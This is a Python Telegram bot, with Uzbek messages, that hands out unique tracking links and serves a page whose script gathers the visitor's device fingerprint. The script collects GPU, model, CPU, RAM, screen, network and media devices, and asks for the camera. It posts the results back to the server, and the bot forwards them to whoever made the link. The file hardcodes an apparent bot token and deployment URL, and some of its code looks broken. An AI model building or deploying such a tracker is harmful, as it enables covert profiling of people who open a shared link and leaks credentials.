#!/usr/bin/env python3
# bot.py
import logging
import os
import uuid
import json
import asyncio
from datetime import datetime
from aiohttp import web, ClientSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, CallbackQueryHandler
)

# ---------------- LOG ----------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------------- ENV ----------------
BOT_TOKEN = ("8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
WEBHOOK_DOMAIN = ("https://fit-roanna-runex-7a8db616.koyeb.app/")

if not BOT_TOKEN:
    logger.error("BOT_TOKEN muhim! ENV ga qo'ying.")
    exit(1)
if not WEBHOOK_DOMAIN:
    logger.error("WEBHOOK_DOMAIN muhim! (https://...)")
    exit(1)

# ---------------- GLOBAL STATE ----------------
USER_TOKENS = {}  # token -> telegram_id

# ---------------- Telegram Handlers ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Salom! /tracklink buyrug'ini yuboring.")

async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    await update.message.reply_text(
        f"🔗 Sizning unikal havolangiz:\n{link}\n\n"
        "Buni brauzerda oching — qurilma ma'lumotlari sizga Telegram orqali yuboriladi."
    )

# ---------------- Web Server ----------------
async def track_page(request):
    token = request.query.get('token')
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto'g'ri yoki eskirgan havola.", status=403)

    html = f"""
    <html><head><title>Ma'lumot yig'ilmoqda...</title></head><body>
    <h2>Ma'lumotlar yig'ilmoqda...</h2>
    <script>
      async function collect() {{
        const data = {{
          timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
          utcOffset: -new Date().getTimezoneOffset() / 60,
          languages: Array.from(navigator.languages || [navigator.language]).join(', '),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          os: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : 'Noma\\'lum',
          browser: 'Noma\\'lum',
          screen: `${{screen.width}} × ${{screen.height}}`,
          viewport: `${{window.innerWidth}} × ${{window.innerHeight}}`,
          screenDepth: `rang: ${{screen.colorDepth}}-bit, piksel: ${{screen.pixelDepth}}-bit`,
          cpuCores: navigator.hardwareConcurrency || 'Noma\\'lum',
          ram: navigator.deviceMemory ? `${{navigator.deviceMemory}} GB` : 'Noma\\'lum',
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Phone/Tablet' : 'Desktop',
          network: 'Noma\\'lum',
          gpu: 'Noma\\'lum',
          model: 'Noma\\'lum',
          mediaDevices: 'Ruxsat berilmadi',
          cameraRes: 'Noma\\'lum'
        }};

        // Brauzer
        if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
        else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
        else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';

        // Tarmoq
        if ('connection' in navigator) {{
          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if (conn) data.network = `${{conn.effectiveType || '?'}} ~ ${{conn.downlink || '?'}} Mbps`;
        }}

        // GPU
        try {{
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (gl) {{
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Aniqlanmadi';
          }}
        }} catch(e) {{}}

        // Model (Chrome 101+)
        if ('userAgentData' in navigator && navigator.userAgentData.getHighEntropyValues) {{
          try {{
            const ua = await navigator.userAgentData.getHighEntropyValues(['model']);
            data.model = ua.model || 'Noma\\'lum';
          }} catch(e) {{}}
        }}

        // Media qurilmalar
        try {{
          const devices = await navigator.mediaDevices.enumerateDevices();
          const audioIn = devices.filter(d => d.kind === 'audioinput').length;
          const audioOut = devices.filter(d => d.kind === 'audiooutput').length;
          const video = devices.filter(d => d.kind === 'videoinput').length;
          data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{video}} ta`;
        }} catch(e) {{}}

        // Kamera o'lchamlari
        try {{
          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
          const [track] = stream.getVideoTracks();
          const caps = track.getCapabilities();
          if (caps.width && caps.height) {{
            data.cameraRes = `${{caps.width.max}} x ${{caps.height.max}} @${{caps.frameRate?.max || '?'}}fps`;
          }}
          track.stop();
          stream.getTracks().forEach(t => t.stop());
        }} catch(e) {{}}

        fetch('/submit', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{ token: '{token}', ...data }})
        }}).then(() => {{
          document.body.innerHTML = '<h2>✅ Ma\\'lumotlar yuborildi!</h2>';
        }});
      }}
      collect();
    </script>
    </body></html>
    """
    return web.Response(text=html, content_type='text/html')

async def submit_data(request):
    try:
        data = await request.json()
        token = data.get('token')
        telegram_id = USER_TOKENS.get(token)
        if not telegram_id:
            return web.json_response({{"error": "Token not found"}}, status=400)

        utc_offset = data.get('utcOffset', 5)
        utc_str = f"+{int(utc_offset):02}" if utc_offset >= 0 else f"{int(utc_offset):02}"

        message = f"""
Kichik eslatma link telegram orqali ochilsa

Qurilma ma'lumoti
{data.get('timestamp', 'Noma\'lum')}
Vaqt zonasi: {data.get('timezone', 'Noma\'lum')}
(UTC{utc_str}:00)
Joylashuv: ruxsat berilmadi
Til: {data.get('languages', 'Noma\'lum')}
Tizim: {data.get('os', 'Noma\'lum')} | Brauzer: {data.get('browser', 'Noma\'lum')}
Qurilma: {data.get('model', 'Noma\'lum')}
({data.get('deviceType', 'Noma\'lum')})
CPU: {data.get('cpuCores', '?')} ta | RAM: {data.get('ram', '?')}
Ekran: {data.get('screen', '?')}
Ekran chuqurligi: {data.get('screenDepth', '?')}
Ko'rinish (viewport): {data.get('viewport', '?')}
Qurilmalar: {data.get('mediaDevices', 'Ruxsat berilmadi')}
Kamera: {data.get('cameraRes', 'Noma\'lum')}
Internet: {data.get('network', 'Noma\'lum')}
GPU: {data.get('gpu', 'Noma\'lum')}
UA: {data.get('userAgent', 'Noma\'lum')}
        """.strip()

        await request.app['bot'].send_message(chat_id=telegram_id, text=message)
        return web.json_response({{"status": "ok"}})
    except Exception as e:
        logger.exception(f"[SUBMIT ERROR] {e}")
        return web.json_response({{"error": str(e)}}, status=500)

# ---------------- Web Server Starter ----------------
async def start_web_server(bot):
    app = web.Application()
    app['bot'] = bot
    app.router.add_get('/track', track_page)
    app.router.add_post('/submit', submit_data)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")

# ---------------- Main ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tracklink", cmd_tracklink))

    # Web serverni ishga tushirish
    asyncio.create_task(start_web_server(app.bot))

    logger.info("🚀 Bot ishga tushdi. /tracklink yuboring.")
    app.run_polling()

if __name__ == "__main__":
    main()
